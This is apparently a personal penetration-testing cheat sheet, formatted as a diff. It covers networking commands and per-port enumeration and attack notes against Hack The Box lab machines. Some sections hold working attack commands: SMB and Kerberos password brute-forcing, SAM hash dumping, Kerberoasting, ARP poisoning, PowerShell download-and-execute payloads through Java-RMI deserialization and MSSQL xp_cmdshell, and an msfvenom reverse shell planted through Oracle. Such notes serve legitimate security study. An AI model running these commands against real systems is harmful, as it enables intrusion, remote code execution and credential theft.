+			TODO: $ grep -rin dev /etc/sysconfig/network*
+		
+		{{{ #Add/Delete Static Route
+			- Centos
+				- default 
+					$ ip route del default 
+					$ route del default gw 1.1.1.1
+					$ ip route add default via 192.168.1.1
+					$ route add -net 2.2.2.2 netmask 255.255.255.255 gw 1.1.1.1 
+				- other 
+					$ ip route add 192.168.1.0/29 via 172.16.0.3 			#dev eth0		#Running
+					$ ip route add default 192.168.1.0/29 via 172.16.0.3 	#dev eth0		#Running
+					$ route add -net 172.17.0.0 netmask 255.255.255.128 gw 172.18.31.12		#Running 
+					$ route del -net 172.17.0.0 netmask 255.255.255.128
+					$ echo '172.17.0.0/25 via 172.18.31.12' > /etc/sysconfig/network-scripts/route-eth0	#Persistant
+			- Solaris
+				$ route add 172.17.0.0/25 172.18.31.12		#Running
+				$ route delete 172.17.0.0/25 172.18.31.12	#Running 
+				- if /etc/gateways exists 
+					$ echo 'net 172.17.0.0/25 gateway 192.168.11.15 metric 2 passive' >> /etc/gateways	#Persistant
+				- if /etc/gateways does not exist 
+					$ echo '172.17.0.0/25 192.168.11.15' >> /etc/inet/static_routes 	#Persistant
+					
+		}}} #
+		{{{ #Enable Routing
+			- Centos
+				- In running memory 
+					$ sudo sysctl -w net.ipv4.ip_forward=1
+					$ sudo sysctl net.ipv4.ip_forward
+				- Persistant
+					$ vi /etc/sysctl.conf
+						$ net.ipv4.ip_forward = 1
+			- Solaris
+				$ svcadm enable ipv4-forwarding
+				$ svcs ipv4-forwarding
+		}}} #
+		{{{ #Get Routing Table 
+			$ netstat -an
+			$ route 
+			$ route -n 
+			$ ip route show
+
+			# Default Routes (Usually)
+				- An entry for each LAN to which the system belongs,
+				- An entry for the link-local (169.254.x.x) network, and
+				- The default gateway, usually shown with the "G" flag.	
+				
+		}}} #
+		{{{ #Turn on/off interface
+			- CentOS
+				$ sudo ip link set eth1 up
+				
+		}}} #
+
+	}}} #
+	{{{ #Subinterface Creation
+		```O
+		cp /etc/sysconfig/network-scripts/ifcfg-lo /etc/sysconfig/network-scripts/ifcfg-lo:1
+		vim /etc/sysconfig/network-scripts/ifcfg-lo:1
+			DEVICE=lo:0
+			IPADDR=192.168.11.254 	#This can be anything. Make it the spoof target if doing an arp cache poison
+			NETMASK=255.255.255.255
+		service network reload
+		```C
+		
+	}}} #
+	{{{ #traceroute
+		- UDP  
+			$ traceroute -U yee.wtf 
+		- ICMP echo (udp probes)
+			$ traceroute -I yee.wtf 
+		- Specify destination port 
+			$ traceroute -T -p 80 yee.wtf 
+		- Notes:
+			- A hop that outputs * * * means that the router at that hop doesn't respond to the type of packet being used for the traceroute.
+			- Traceroute sends 3 probes at each TTL setting. The three times are travel time for each probe.
+		
+	}}} #
+
+}}} #
+{{{ #Windows
+{{{ #Layer 2
+	- Display arp cache
+		$ arp -a
+	- Add static arp table entry
+		$ arp -s 192.168.1.2 AB-CD-EF-00-11-22
+	- Remove arp table entry
+		$ arp -d 192.168.1.2
+		$ arp -d *								#Delete all entries in table
+		$ netsh interface ip delete neighbors	#Delete all entries in table
+
+}}} #
+{{{ #Layer 3
+	{{{ #DNS
+		- Get data from hosts file and recent reccords
+			$ ipconfig /displaydns
+		- Get Domain Name
+			$ systeminfo | findstr /C:"Domain
+			$ wmic computersystem get domain
+			$ echo %userdomain%					# If not in a domain, systemname is returned
+		- Query DNS Server 
+			$ nslookup www.google.com
+		- Change hostname
+			$ wmic computersystem where name="%computername%" call rename name=PC_06	#No change until reboot
+		- Add a new DNS Server 	
+			$ netsh dnsclient add dnsserver "Local Area Connection 2" 8.8.8.8			# success if no output
+		- Delete a DNS Server
+			$ netsh dnsclient delete dnsserver "Local Area Connection 2" 8.8.8.8		# success if no output
+		- Discard DNS Entries
+			$ ipconfig /flushdns				
+		- Initiate dynamic DNS registration 
+			$ ipconfig /registerdns	
+	
+	}}} #
+	{{{ #DHCP
+		- Release/Renew DHCP config 	
+			$ ipconfig /release					#Release all DHCP Configs from all interfaces (a single interface can be specified)
+			$ ipconfig /renew					#Renews all DHCP Configs from all interfaces (a single interface can be specified)		
+
+	}}} #
+	{{{ #IP
+		- Get IP info 
+			$ ipconfig /all
+		- Change IP Address
+			$ netsh interface ipv4 set address name="Local Area Connection 2" source=static address=192.168.1.2 mask=255.255.255.0 gateway=192.168.1.1
+			
+	}}} #
+	{{{ #Routing
+		- Get routing Table
+			$ route print
+			$ netstat -r 
+		- Add a static route 
+			$ route add -p 192.168.103.0 mask 255.255.255.0 192.168.15.1 metric 1	#-p makes it persistant across reboots
+			$ netsh interface ipv4 add route 192.168.103.0/24 "Local Area Connection 2" 192.168.15.1 
+		- Remove a static route 
+			$ route delete 192.168.103.0
+			$ netsh interface ipv4 delete route 192.168.103.0/24 "Local Area Connection" 192.168.15.1		
+
+	}}} #
+		
+	}}} #		
+{{{ # TroubleShooting
+	- Map Connections to Binaries
+		$ fport
+	- Display all active and Listening Connections
+		$ netstat -anob 
+	- Display connections via protocol 
+		$ netstat -napo TCP
+		$ netstat -napo UDP
+
+}}} #
+
+}}} #
+
+}}} ###
+{{{ ###Protocols
+{{{ #53		DNS
+	{{{ #Initial
+		$ dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
+		$ dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}
+		$ dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
+		$ dig axfr @{IP}
+		$ dig axfr {Domain_Name} @{IP}
+		$ nslookup
+			$ SERVER {IP}
+			$ 127.0.0.1
+			$ {IP}
+			$ Domain_Name
+			$ exit
+
+	}}} #
+	{{{ #Subdomain
+		$ nslookup  
+			$ SERVER 10.10.10.29  
+				Default server: 10.10.10.29  
+				Address: 10.10.10.29#53  
+				> 127.0.0.1  
+				1.0.0.127.in-addr.arpa name = localhost.  
+				> 10.10.10.29  
+				** server can't find 29.10.10.10.in-addr.arpa: NXDOMAIN  
+				> bank.htb  
+				Server: 10.10.10.29  
+				Address: 10.10.10.29#53  
+		  
+				Name: bank.htb  
+				Address: 10.10.10.29  
+		  
+		$ dnsrecon -r 127.0.0.0/24 -n 10.10.10.29  
+		$ dnsrecon -r 127.0.1.0/24 -n 10.10.10.29  
+		$ dnsrecon -r 10.10.10.0/24 -n 10.10.10.29  
+		  
+		$ dig axfr @10.10.10.29   
+			; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr @10.10.10.29  
+			; (1 server found)  
+			;; global options: +cmd  
+			;; Query time: 154 msec  
+			;; SERVER: 10.10.10.29#53(10.10.10.29)  
+			;; WHEN: Sat Jul 20 12:18:47 EDT 2019  
+			;; MSG SIZE rcvd: 28  
+		  
+		$ dig axfr bank.htb @10.10.10.29 
+			; <<>> DiG 9.11.5-P4-5.1-Debian <<>> axfr bank.htb @10.10.10.29  
+			;; global options: +cmd  
+			bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800  
+			bank.htb. 604800 IN NS ns.bank.htb.  
+			bank.htb. 604800 IN A 10.10.10.29  
+			ns.bank.htb. 604800 IN A 10.10.10.29  
+			[www.bank.htb. 604800 IN CNAME bank.htb.](http://www.bank.htb.)  
+			bank.htb. 604800 IN SOA bank.htb. chris.bank.htb. 2 604800 86400 2419200 604800  
+			;; Query time: 152 msec  
+			;; SERVER: 10.10.10.29#53(10.10.10.29)  
+			;; WHEN: Sat Jul 20 12:19:03 EDT 2019  
+			;; XFR size: 6 records (messages 1, bytes 171)  
+
+		$ vim /etc/resolv.conf  
+			# Generated by NetworkManager  
+			search localdomain  
+			nameserver 10.10.10.29  
+			nameserver 192.168.163.2  
+		  
+		- can navigate to bank.htb now!!	
+	
+	}}} #
+	
+
+
+}}} #
+{{{ #80         Web
+    {{{ #Enumerate SSRF Open Ports (.sh)
+```O
+for x in {1..65535};
+    do cmd=$(curl -so /dev/null http://10.10.146.104:8000/attack?url=http://2130706433:${x} -w '%{size_download}');
+        if [ $cmd != 1045 ]; then
+                    echo "Open port: $x"
+                        fi
+                        done
+#This will take for muthafukin ever
+```C
+
+    }}} #
+
+}}} #
+{{{ #88  	kerberos
+	- Kerberos is used in Active Directory. In this platform, Kerberos provides information about the privileges of each user, but it is responsability of each service to determine if the user has access to its resources.
+	- Enumeration
+		- Pre-Creds
+			- nmap
+				$ nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/usr/share/seclists/Usernames/Names/names.txt 10.10.10.52        #Need to know domain name
+		- With Username/s
+			- Kerbrute 
+				$ python /root/Desktop/Tools/kerbrute/kerbrute.py -user svc-alfresco -passwords /root/Desktop/Tools/Wordlists/rockyou.txt -domain HTB -dc-ip 10.10.10.161
+			- ridenum	
+				$ python2 /root/Desktop/Tools/ridenum/ridenum.py 10.10.10.161 500 50000 /root/Desktop/Tools/Wordlists/rockyou.txt users.txt      #users.txt is self generated from list of found users
+		- With Creds
+			- kerberROAST 
+				$ GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+
+}}} #
+{{{ #113  	ident
+	- Ident is an Internet protocol that helps identify the user of a particular TCP connection.
+	- Enumeration
+		- Get Owner of Open Ports 
+			$ ident-user-enum 192.168.1.13 22 139 445  		#Try all open ports 
+
+}}} #
+{{{ #137	NetBios Name Service
+	- Get Local Hostname/Domain name
+		$ nbtstat -rn
+	- Get Remote Hostname/Domain Name
+		$ nbtstat -A 192.168.11.13
+	
+	- Netbios Name
+		- Name types  describe the functionality of each name entry.
+		- NetBIOS Suffix Table 
+			- KEY
+				- U = Unique (Only one machine can have a name 
+				- G = Group (many machines can have the same name)
+		
+	Name			| Suffix	| Type	| Usage
+	---				| ---		| ---	| ---
+	<computername>	|: 00		| U		| Workstation
+	<computername>	|: 01		| U     | Messenger
+	<\\--_MSBROWSE_>|: 01		| G     | Master Browser
+	<computername>	|: 03		| U     | Messenger
+	<computername>	|: 20		| U     | File Server 
+	<domain>		|: 00		| G     | Domain Name
+	<domain>		|: 1B		| U     | Domain Master Browser
+	<domain>		|: 1C		| G     | Domain Controllers
+	<domain>		|: 1D		| U     | Master Browser
+	<domain>		|: 1E		| G     | Browser Service Elector
+	<username>		|: 03		| U     | Messenger Service 
+
+
+}}}
+{{{ #161  	SNMP 
+	- Simple Network Management Protocol is a protocol used to monitor different devices in the network (like routers, switches, printers, IoTs...).
+	- Enumeration
+		$ snmp-check 10.10.10.161
+
+}}} #
+{{{ #389  	LDAP
+	- LDAP (Lightweight Directory Access Protocol) is a software protocol for enabling anyone to locate organizations, individuals, and other resources such as files and devices in a network, whether on the public Internet or on a corporate intranet. LDAP is a "lightweight" (smaller amount of code) version of Directory Access Protocol (DAP).
+	- Resources
+		- HTB Videos
+			- ypuffy 
+			- sizzle 
+	- Notes:
+		- IF	 FQDN=ypuffy.hackthebox.htb  		Then 		base='DC=hackthebox,DC=htb'		
+	- Enumeration
+		$ nmap -p 389 --script ldap-search -Pn 10.10.10.107  
+		$ ldapsearch -h 10.10.10.161 -x  
+		$ ldapsearch -h 10.10.10.161 -x -s base namingcontexts <this should dump domain name ex DC=htb,DC=local	#THERE IS NO E IN NAM 
+		$ ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" <dumps assload of queryable ldap stuff  
+		$ ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" ‘(objectClass=Person)’ sAMAccountName <example of ldap query  
+		- -D ‘squid@htb.local’ -w ‘YeeYeeYee’ <syntax to add credentials  
+		- Grep for sAMAccountName to get Domain Admins
+			$ ldapsearch -x -h sizzle.htb.local -D ‘amanda@htb.local’ -w ‘Ashare1972’ -b ‘dc=htb,dc=local’ "(&(objectClass=user)(memberof=CN=Domain Admins,CN=Users,DC=htb,DC=local))"  
+
+ }}} #
+{{{ #445  	SMB
+	- While Port 139 is known technically as ‘NBT over IP’, Port 445 is ‘SMB over IP’. SMB stands for ‘Server Message Blocks’. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.
+
+	{{{ #Brute Force
+		- crackmapexec
+			$ crackmapexec smb 10.10.10.161 -u userlist.txt -p passwordlist.txt  
+		- Python Script
+			#!/bin/python3  
+			import os  
+			names = [  
+			"zach", "gustavo", "claude", "per", "felicia", "claire", "fred", "annette", "stevie", "angela", "ulf", "marcus", "abigail", "sally", "annika", "marko", "melanie", "paulo"  
+			]  
+			for name in names:  
+			print(name)  
+			os.system("smbmap -u {} -d megabank.local -p Welcome123! -H 10.10.10.169".format(name))  
+	  
+		- Better Python Script 
+			#!/usr/bin/python3  
+			import os  
+			import subprocess  
+			  
+			users = open('users.txt').read().split()  
+			passs = open('pass.txt').read().split()  
+			  
+			for user in users:  
+			for pw in passs:  
+			print("{}:{}".format(user,pw))  
+			os.system("smbmap -u {} -d megabank.local -p {} -H 10.10.10.172".format(user, pw))
+
+	}}} #
+	{{{ #Credential Usage
+		- Enumerate Shares
+			$ crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares  
+		- Get NTLM Hashes (SAM dump)
+			$ ./secretsdump.py htb.local/squid:YeeYeeYee@10.10.10.161  
+		- Get Shell
+
+	}}} #
+	{{{ #Enumeration 
+		- With No Creds
+			$ nbtscan 127.0.0.1
+			$ smbmap -H 127.0.0.1
+			$ smbmap -H 127.0.0.1 -u null -p null
+			$ smbclient -N -L //127.0.0.1
+			$ smbclient -N //127.0.0.1/ --option="client min protocol"=LANMAN1
+			$ rpcclient 127.0.0.1
+			$ rpcclient -U "" 127.0.0.1
+			$ crackmapexec smb 127.0.0.1
+			$ crackmapexec smb 127.0.0.1 --pass-pol -u "" -p ""
+			$ GetADUsers.py -dc-ip 127.0.0.1 "yee.wtf/" -all
+			$ GetNPUsers.py -dc-ip 127.0.0.1 -request "yee.wtf/" -format hashcat
+			$ GetUserSPNs.py -dc-ip 127.0.0.1 -request "yee.wtf/"
+			$ getArch.py -target 127.0.0.1
+
+		- With Creds
+			$ smbmap -H 127.0.0.1 -u Squid -p Y337C4nn0n!
+			$ smbclient -h "\\\\127.0.0.1\\\" -U yee.wtf -W Squid -l 127.0.0.1
+			$ smbclient -h "\\\\127.0.0.1\\\" -U yee.wtf -W Squid -l 127.0.0.1 --pw-nt-hash `hash`
+			$ crackmapexec smb 127.0.0.1 -u Squid -p Y337C4nn0n! --shares
+			$ GetADUsers.py yee.wtf/Squid:Y337C4nn0n! -all
+			$ GetNPUsers.py yee.wtf/Squid:Y337C4nn0n! -request -format hashcat
+			$ GetUserSPNs.py yee.wtf/Squid:Y337C4nn0n! -request
+
+			- https://book.hacktricks.xyz/pentesting/pentesting-smb
+
+	}}} #
+	{{{ #Tools
+		{{{ #enum4linux
+			- Generic Syntax
+				$ enum4linux -a 192.168.11.140  
+				$ enum4linux -u marko -p Welcome123! -a 10.10.10.169
+
+		}}} #
+		{{{ #nmap
+			- Generic Syntax 
+				$ nmap --script smb-vuln* -p 139,445 192.168.11.1
+				$ nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10
+				$ nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
+
+		}}} #
+		{{{ #nmblookup (Linux)
+			- Get Lan Machine Info 
+				$ nmblookup -A 1.1.1.1
+		
+		}}} #
+		{{{ #smbmap
+			- Generic Syntax
+		smbmap -H 192.168.11.140 -P 139 -R
+		smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -R  
+		smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -x whoami
+
+		}}} #
+		{{{ #smbclient
+			- Download All Files
+				$ smbclient '\\192.168.xx.xx\share$
+				$ mask ""  
+				$ recurse ON  
+				$ prompt OFF  
+				$ cd 'path\to\remote\dir'  
+				$ lcd '~/path/to/download/to/'  
+				$ mget *
+
+		}}} #
+		{{{ #GetADUsers.py
+			- Generic Syntax
+				$ GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
+
+		}}} #
+		{{{ #ridenum
+			- Generic Syntax 
+				$ python2 /Yeet/Tools/ridenum/ridenum.py 10.10.10.161 500 50000 /Yeet/Tools/Wordlists/rockyou.txt users.txt <<users.txt is self generated from list of found users  
+				$ python2 /root/Desktop/Tools/ridenum/ridenum.py 10.10.10.169 500 50000 melanie Welcome123!
+
+		}}} #
+		{{{ #rpcclient
+			- Generic Syntax
+				$ rpcclient -U "" -N 192.168.11.140
+
+		}}} #
+
+	}}} #
+
+}}} #
+{{{ #1099 	Java-RMI
+	- Communication between Java programs that are not in the same address space.
+	- Exploitation Example
+		$ nmap -sC -sV -Pn 10.11.1.73 -p 1100 
+			may dump the reg of the java-rmi instance. If this is the case the machine may be vulnerable to a deserializaion exploit.
+			BaRMIe.jar is the way to go to directly exploit this vulnerability.
+			https://github.com/NickstaDB/BaRMIe/releases/tag/v1.01      is where the latest build is hosted, pre-built
+
+		$ java -jar BaRMIe_v1.01.jar -attack 10.11.1.73 1100
+			$ target select)          1
+			$ available attacks)    1 (illegal bind deserialization)
+			$ payloads)                1 (Apache Common Collections 3.1 worked for me, others may also work)
+			$ OS Command)         powershell.exe -command "IEX(new-object net.webclient).downloadstring('http://192.168.119.167:80/3232.ps1')"
+
+		- enjoy your system shell!
+
+}}} #
+{{{ #1433 	MSSQL
+	- A software product with the primary function of storing and retrieving data as requested by other software applications—which may run either on the same computer or on another computer across a network (including the Internet)
+	- Get MSSQL Shell
+		$ sqsh -S 10.10.10.59 -U sa -P GWE3V65#6KFH93@4GWTG2G  
+		$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth 
+	- Get xp_cmdshell
+		1. try and see if it works  
+			$ xp_cmdshell ‘whoami’  
+			$ go  
+		  
+		2. try to turn component back on  
+			$ EXEC SP_CONFIGURE 'xp_cmdshell' , 1  
+			$ reconfigure  
+			$ go  
+			$ xp_cmdshell ‘whoami’  
+			$ go  
+		  
+		3. 'advanced' turn it back on  
+			$ EXEC SP_CONFIGURE 'show advanced options', 1  
+			$ reconfigure  
+			$ go  
+			$ EXEC SP_CONFIGURE 'xp_cmdshell' , 1  
+			$ reconfigure  
+			$ go  
+			$ xp_cmdshell 'whoami'  
+			$ go  
+	- xp_cmdshell  
+		$ xp_cmdshell "powershell.exe -exec bypass iex(new-object net.webclient).downloadstring('[http://10.10.14.60:8000/ye443.ps1')"](http://10.10.14.60:8000/ye443.ps1'))  
+	- Get NTLM Hash
+		- Setup an pythonsmbserver
+			$ python3 smbserver.py -smb2support tools `pwd`
+			$ exec xp_dirtree '\\10.10.14.8\tools',1,1  
+			$ hashcat64.exe -m 5600 .\yeet\Querier.txt .\yeet\rockyou.txt --show
+
+}}} #
+{{{ #1521 	Oracle
+	{{{ #Get ODAT
+		- navigate to https://github.com/quentinhardy/odat/releases/  
+		- Download the latest  
+			$ tar -xvf odat-linux-libc2.12-x86_64.tar.gz  
+			$ cd odat-libc2.12-x86_64/  
+			$ ./odat-libc2.12-x86_64 all -s 10.10.10.82  
+			https://github.com/quentinhardy/odat/wiki](https://github.com/quentinhardy/odat/wiki
+			https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573](https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573
+	
+	}}} #
+	{{{ #Exploitation Example
+		1. If db is password protected  
+			$ hydra -P /Yeet/Tools/Wordlists/rockyou.txt -t 32 -s 1521 10.10.10.82 oracle-listener  
+		2. Get sid  
+			$ nmap --script=oracle-sid-brute -p 1521 10.10.10.82  
+			--or--  
+			$ hydra -L ./sids.txt -s 1521 10.10.10.82 oracle-sid  
+			--or--  
+			$ python3 /Yeet/Machines/HTB/Silo/odat/odat sidguesser -s 10.10.10.82  
+			--or--  
+			$ python3 /Yeet/Machines/HTB/Silo/odat/odat all -s 10.10.10.82 <<<<recomended to start even though it be way slow    
+		3. brute logins on the sid  
+			$ python3 ./odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file ../oracle_userpass.txt  		  
+		4. login with sqlplus64 (subnode)  
+		    
+		5. Shot in the dark. Try to upload and execute msfvenom shellcode with your creds  
+			$ msfvenom -p windows/x64/shell/reverse_tcp lhost=10.10.14.60 lport=3232 -f exe >3232.exe  
+			$ python3 ./odat.py utlfile -s 10.10.10.82 --sysdba -d XE -U scott -P tiger --putFile /temp 3232.exe 3232.exe  
+			$ nc -nlvp 3232  
+			$ python3 ./odat.py externaltable -s 10.10.10.82 -U -P tiger -d XE --sysdba --exec /temp 3232.exe  
+			- enjoy your shell!    
+  
+	}}} #
+	{{{ #SQL Interaction
+		- login
+			$ sqlplus64 scott/tiger@10.10.10.82:1521/XE  
+			$ sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba <to login as sysdba  
+		
+		- Get Priviledge Level  
+			$ select * from session_privs; To show privledge  
+			$ select * from user_role_privs;  
+	  
+		- Turn on screen output
+			$ set serveroutput ON  
+	  
+		- Short script to read files 
+			$ declare  
+			$ f utl_file.file_type;  
+			$ s varchar(200);  
+			$ begin  
+			$ f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'r');  
+			$ utl_file.get_line(f,s);  
+			$ utl_file.fclose(f);  
+			$ dbms_output.put_line(s);  
+			$ end;  
+			$ /  
+	  
+		- Short script to write files
+			$ declare  
+			$ f utl_file.file_type;  
+			$ s varchar(5000) := 'yeet';  
+			$ begin  
+			$ f := utl_file.fopen('/inetpub/wwwroot', 'cannon.txt', 'w');  
+			$ utl_file.put_line(f,s);  
+			$ utl_file.fclose(f);  
+			$ end;  
+			$ /
+
+	}}} #
+	
+}}} #
+{{{ #2049 	NFS
+	- Get Available shares 
+		$ apt install nfs-common  
+		$ showmount 10.10.10.180 ~or~showmount -e 10.10.10.180  
+	
+	- Mount to PrivEsc 
+		- https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/privilege-escalation/linux/linux-examples.rst
+		$ mount -t nfs -o ver=2 10.10.10.180:/home /mnt/  
+		$ cd /mnt  
+		- vim into /etc/passwd and change the uid (probably 1000 or 1001) to match the owner of the files if you are not able to get in
+
+}}} #
+{{{ #3306 	MySql 
+	- MySQL is a freely available open source Relational Database Management System (RDBMS) that uses Structured Query Language (SQL).
+
+}}} #
+{{{ #5985 	WinRM 
+	- Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.
+	- https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/
+	- evil-winrm
+		$ sudo gem install winrm winrm-fs colorize stringio 
+		$ git clone https://github.com/Hackplayers/evil-winrm.git 
+		$ cd evil-winrm
+		$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’
+		- For easy binary upload (-s for scripts upload)
+			$ ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
+			$ menu
+			$ invoke-binary `tab`
+
+	- Execute with python3
+		$ python3
+		$ import winrm
+		$ s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
+		$ print(s.run_cmd('ipconfig'))
+		$ print(s.run_ps('ipconfig'))
+
+}}} #
+
+}}} ###
+{{{ ###Tools
+{{{ #arpping
+	- Send one frame
+		$ arping -c 1 -I eth0 192.168.11.14
+	- Reduce identifying info
+		$ arping -D 192.168.0.14
+			- The ARP requests that are sent do not include the IP address in the payload.
+			- However, the MAC address of the machine is still the source address of the frame and is included in the ARP payload.
+	- Arp Cache Poisoning
+		#Create a subinterface (see nix commands)
+		$ arping -c 1 -I eth0 -s 192.168.11.254 192.168.11.14
+			#-s=the IP you are spoofing. 
+			#The last IP=the machine you are sending the arp frame to.
+	- Not quite spoofing...
+		- One possible syntax is arping -Us 192.168.11.254 192.168.11.14. 
+		- This will send ARP requests to the target with target IP address 192.168.11.14.
+		- Using the -A option instead of -U would cause arping to 
+		- send ARP replies to the target with target IP address 192.168.11.14.
+
+}}} #
+{{{ #bash
+	- Ping Socket (test socket connectivity)
+		$ exec 3232 <> /dev/tcp/1.1.1.1/80
+
+}}}
+{{{ #iperf3
+	- Network Speed Testing Tool
+	
+	- On Server:
+		$ yum -y install iperf3
+		$ firewall-cmd --add-port 5201/tcp --permanent
+		$ firewall-cmd --add-port 5201/tcp --permanent
+		$ iperf3 -s
+	- On Client:
+		$ yum -y install iperf3
+		$ firewall-cmd --add-port 5201/tcp --permanent
+		$ firewall-cmd --add-port 5201/tcp --permanent
+		$ iperf3 -c x.x.x.x
+
+}}} #
+{{{ #p0f
+	- Collect Data 
+		$ tcpdump -s0 -i eth0 -w yeet.pcap						#All 
+		$ tcpdump -s0 -i eth0 'tcp[13] == 2' -w yeet.pcap 		#Only Syn
+	- Compare Against p0f 
+		$ p0f -r /root/yeet.pcap
+
+}}} #
+{{{ #putty
+	- Generic Syntax
+		$ putty.exe -ssh root@192.168.11.13 22 -pw L33tHax0r -L 127.0.0.1:32031:192.168.111.116:22
+
+}}} #
+{{{ #python
+	{{{ #scapy
+
+		- Ether layer broadcast, specified mac, and encapsulated IP packet
+			$ a = Ether(dst="ff:ff:ff:ff:ff:ff", src="ab:cd:ef:ab:cd:ef", type=0x0800)
+			$ a = Ether(dst="ff:ff:ff:ff:ff:ff", src="00:50:56:8e:72:67", type=0x0800)/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr="\x00\x50\x56\x8e\x72\x67")/DHCP(options=[('message-type','discover'),('param_req_list','\x03'),('end')])
+		- Fun Facts
+			- sendp sends at the data link layer
+			- send allows the kernel to add layer 2 information
+		
+		{{{ #Arguments
+			Command							| Purpose
+			---								| ---
+			ls()							| Get protocols 
+			ls(Ether)						| Get fields
+			lsc() 							| Get functions
+			IP()							| Create packet 
+			pkt.show()						| Get fields
+			pkt.dst="1.1.1.1"				| Set Destination
+			pkt=IP(dst="1.1.1.1")			| Set Destination (at construction)
+			pkt=pkt/TCP()					| Set Payload
+			pkt=pkt/Raw("yeeet")			| Set Payload data
+			pkt["TCP"].dport=8080			| Set dport
+			pkt["TCP"].sport=3232			| Set sport
+			pkt["Raw"].load = "Hoes"		| Set payload
+			str(pkt)						| Get hexdump
+			send(pkt)						| Send at layer 3
+			sendp(pkt)						| Send at layer 2
+			srloop(pkt, count=15)			| Send Multiple packets 
+			pkts=sniff(count=100,timeout=10)| Capture Traffic 
+			pkts.show()						| Get all captured traffic
+			pkts[5].show()					| Get 6th packet captured 
+			print pkts[5]["IP"].dst			| Get captured packet fields
+		
+		}}} #
+		{{{ #ping
+			$ scapy
+			$ ippkt	= IP(dst="192.168.11.11")
+			$ pdu	= ICMP()/"Yeet Cannon"
+			$ pkt	= ippkt/pdu 
+			$ pkt.show()
+			$ srloop(pkt, count=10)			#Send packet 10 times 
+		
+		}}} #
+		{{{ #traceroute
+			from scapy.all import *
+
+			pkt = IP(dst = "203.0.113.12")/ICMP()/Raw("Helloworld")
+			for ttl in range(1,30):
+				pkt.ttl = ttl
+				resp  = sr1(pkt)
+				if resp != None:
+					print resp.src
+		
+		}}} #
+		
+	}}} #
+	{{{ #Network Sockets 
+		{{{ #RAW Send Text
+			- On Op Station
+				$ nc -u -l 8080
+
+			- On Target 
+				from socket import *
+				from types import *
+				import struct
+				
+				IPPROTO_RIDP = 17
+				
+				class RIDP:
+					def __init__(self, sport = 0, dport = 0, payload = ""):
+						self.sport 	= sport 
+						self.dport 	= dport 
+						self.length = 0
+						self.checksum 	= 0
+						self.payload	= payload 
+					def show (self):
+						return str(self).encode("hex")
+					def __str__(self):
+						if type(self.payload) != StringType:
+							self.payload = str(self.payload)
+						self.length = 8 + len(self.payload)
+						return struct.pack("!HHHH", self.sport, self.dport, self.length, self.checksum) + self.payload 
+						
+				pkt = RIDP(10000, 8080, "Howdy Ho Neigborieghno")
+				client=socket(AF_INET, SOCK_RAW, IPPROTO_RIDP)
+				client.sendto(str(pkt), ("192.168.11.13", 0))
+				client.close()
+
+		}}} #
+		{{{ #TCP Client Side Generic 
+			from socket import *
+			client=socket(AF_INET, SOCK_STREAM)
+			client.connect(("192.168.11.11", 12345))
+			client.send("Hello World from Client")
+			server_data=client.recv(100)				# Attempt to pull 100 bytes of data sent by server
+			print(server_data)
+			client.close()
+
+		}}} #
+		{{{ #TCP Server Side Generic
+			from socket import *
+			server=socket(AF_INET, SOCK_STREAM)
+			server.bind(("192.168.11.11", 12345))
+			server.listen(10)						#Up to 10 Connections 
+			client,address=server.accept()
+			client_data=client.recv(100)			#Up to 100 bytes from the network buffer
+			print(client_data)
+			client.send=("Hello World from Server")
+			server.close()
+
+		}}} #
+		{{{ #TCP Send Document (Recieve With nc)
+		- On Target (192.168.11.13)
+			$ nc -l 80 > yeet.txt 
+
+		- On Server 
+			#!/usr/bin/python 
+			from socket import *
+			fd = open("data.txt", "r")
+			client = socket(AF_INET, SOCK_STREAM)
+			client.connect(("192.168.11.13", 80))
+			chunk = fd.read(10)
+			while chunk:
+				client.send(chunk)
+				chunk = fd.read(10)
+			client.close()
+			fd.close()
+
+		}}} #
+		{{{ #TCP Recieve Document (Send with nc)
+		- On Target (192.168.11.13)
+			$ nc -l 80 < yeet.txt
+
+		- On Server 
+			#!/usr/bin/python 
+			from socket import *
+			fd = open("data.txt", "w")
+			client = socket(AF_INET, SOCK_STREAM)
+			client.connect(("192.168.11.13", 80))
+			chunk = client.read(10)
+			while chunk:
+				fd.write(chunk)
+				chunk = client.recv(10)
